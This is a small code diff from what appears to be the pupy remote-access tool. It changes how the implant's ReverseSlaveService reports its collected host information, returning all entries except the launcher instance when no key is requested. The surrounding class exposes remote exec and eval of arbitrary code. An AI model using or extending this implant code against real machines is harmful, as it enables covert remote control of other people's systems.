@@ -191,10 +191,19 @@ class ReverseSlaveService(Service):
         """execute arbitrary code (using ``exec``)"""
         execute(text, self.exposed_namespace)
 
-    def exposed_get_infos(self, s):
+    def exposed_get_infos(self, s=None):
         import pupy
+
+        if not s:
+            return {
+                k:v for k,v in pupy.infos.iteritems() if not k in (
+                    'launcher_inst'
+                )
+            }
+
         if s not in pupy.infos:
             return None
+
         return pupy.infos[s]
 
     def exposed_eval(self, text):
